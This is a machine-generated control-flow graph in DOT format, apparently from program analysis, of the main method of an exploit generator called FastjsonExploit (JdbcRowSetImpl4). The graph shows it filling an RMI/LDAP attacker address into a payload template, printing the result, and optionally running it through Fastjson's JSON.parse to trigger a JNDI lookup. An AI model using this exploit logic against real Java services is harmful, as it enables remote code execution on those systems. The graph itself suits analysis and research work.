digraph "unitGraph" {
    "r0 := @parameter0: java.lang.String[]"
    "$i0 = lengthof r0"
    "if $i0 == 1 goto $r1 = r0[0]"
    "$i2 = lengthof r0"
    "if $i2 == 2 goto $r1 = r0[0]"
    "$r9 = <java.lang.System: java.io.PrintStream out>"
    "virtualinvoke $r9.<java.io.PrintStream: void println(java.lang.String)>(\"[*] Usge: java -cp FastjsonExploit-<version>.jar payloads.JdbcRowSetImpl4 <rmi/ldap address>\")"
    "return"
    "$r1 = r0[0]"
    "r2 = virtualinvoke $r1.<java.lang.String: java.lang.String trim()>()"
    "$z0 = staticinvoke <util.AddressParser: boolean isAddress(java.lang.String)>(r2)"
    "if $z0 != 0 goto $r3 = new util.JarFileReader"
    "$r8 = <java.lang.System: java.io.PrintStream out>"
    "virtualinvoke $r8.<java.io.PrintStream: void println(java.lang.String)>(\"[*] address is not rmi or ldap\")"
    "$r3 = new util.JarFileReader"
    "specialinvoke $r3.<util.JarFileReader: void <init>()>()"
    "r4 = $r3"
    "r10 = virtualinvoke r4.<util.JarFileReader: java.lang.String read(java.lang.String)>(\"JdbcRowSetImpl4.tpl\")"
    "r11 = virtualinvoke r10.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>(\"###RMI_LDAP_ADDRESS###\", r2)"
    "$r5 = <java.lang.System: java.io.PrintStream out>"
    "virtualinvoke $r5.<java.io.PrintStream: void println(java.lang.String)>(r11)"
    "$i1 = lengthof r0"
    "if $i1 != 2 goto return"
    "$r6 = r0[1]"
    "$z1 = virtualinvoke $r6.<java.lang.String: boolean equals(java.lang.Object)>(\"-exec\")"
    "if $z1 == 0 goto return"
    "staticinvoke <com.alibaba.fastjson.JSON: java.lang.Object parse(java.lang.String)>(r11)"
    "r0 := @parameter0: java.lang.String[]"->"$i0 = lengthof r0";
    "$i0 = lengthof r0"->"if $i0 == 1 goto $r1 = r0[0]";
    "if $i0 == 1 goto $r1 = r0[0]"->"$i2 = lengthof r0";
    "if $i0 == 1 goto $r1 = r0[0]"->"$r1 = r0[0]";
    "$i2 = lengthof r0"->"if $i2 == 2 goto $r1 = r0[0]";
    "if $i2 == 2 goto $r1 = r0[0]"->"$r9 = <java.lang.System: java.io.PrintStream out>";
    "if $i2 == 2 goto $r1 = r0[0]"->"$r1 = r0[0]";
    "$r9 = <java.lang.System: java.io.PrintStream out>"->"virtualinvoke $r9.<java.io.PrintStream: void println(java.lang.String)>(\"[*] Usge: java -cp FastjsonExploit-<version>.jar payloads.JdbcRowSetImpl4 <rmi/ldap address>\")";
    "virtualinvoke $r9.<java.io.PrintStream: void println(java.lang.String)>(\"[*] Usge: java -cp FastjsonExploit-<version>.jar payloads.JdbcRowSetImpl4 <rmi/ldap address>\")"->"return";
    "$r1 = r0[0]"->"r2 = virtualinvoke $r1.<java.lang.String: java.lang.String trim()>()";
    "r2 = virtualinvoke $r1.<java.lang.String: java.lang.String trim()>()"->"$z0 = staticinvoke <util.AddressParser: boolean isAddress(java.lang.String)>(r2)";
    "$z0 = staticinvoke <util.AddressParser: boolean isAddress(java.lang.String)>(r2)"->"if $z0 != 0 goto $r3 = new util.JarFileReader";
    "if $z0 != 0 goto $r3 = new util.JarFileReader"->"$r8 = <java.lang.System: java.io.PrintStream out>";
    "if $z0 != 0 goto $r3 = new util.JarFileReader"->"$r3 = new util.JarFileReader";
    "$r8 = <java.lang.System: java.io.PrintStream out>"->"virtualinvoke $r8.<java.io.PrintStream: void println(java.lang.String)>(\"[*] address is not rmi or ldap\")";
    "virtualinvoke $r8.<java.io.PrintStream: void println(java.lang.String)>(\"[*] address is not rmi or ldap\")"->"return";
    "$r3 = new util.JarFileReader"->"specialinvoke $r3.<util.JarFileReader: void <init>()>()";
    "specialinvoke $r3.<util.JarFileReader: void <init>()>()"->"r4 = $r3";
    "r4 = $r3"->"r10 = virtualinvoke r4.<util.JarFileReader: java.lang.String read(java.lang.String)>(\"JdbcRowSetImpl4.tpl\")";
    "r10 = virtualinvoke r4.<util.JarFileReader: java.lang.String read(java.lang.String)>(\"JdbcRowSetImpl4.tpl\")"->"r11 = virtualinvoke r10.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>(\"###RMI_LDAP_ADDRESS###\", r2)";
    "r11 = virtualinvoke r10.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>(\"###RMI_LDAP_ADDRESS###\", r2)"->"$r5 = <java.lang.System: java.io.PrintStream out>";
    "$r5 = <java.lang.System: java.io.PrintStream out>"->"virtualinvoke $r5.<java.io.PrintStream: void println(java.lang.String)>(r11)";
    "virtualinvoke $r5.<java.io.PrintStream: void println(java.lang.String)>(r11)"->"$i1 = lengthof r0";
    "$i1 = lengthof r0"->"if $i1 != 2 goto return";
    "if $i1 != 2 goto return"->"$r6 = r0[1]";
    "if $i1 != 2 goto return"->"return";
    "$r6 = r0[1]"->"$z1 = virtualinvoke $r6.<java.lang.String: boolean equals(java.lang.Object)>(\"-exec\")";
    "$z1 = virtualinvoke $r6.<java.lang.String: boolean equals(java.lang.Object)>(\"-exec\")"->"if $z1 == 0 goto return";
    "if $z1 == 0 goto return"->"staticinvoke <com.alibaba.fastjson.JSON: java.lang.Object parse(java.lang.String)>(r11)";
    "if $z1 == 0 goto return"->"return";
    "staticinvoke <com.alibaba.fastjson.JSON: java.lang.Object parse(java.lang.String)>(r11)"->"return";
}
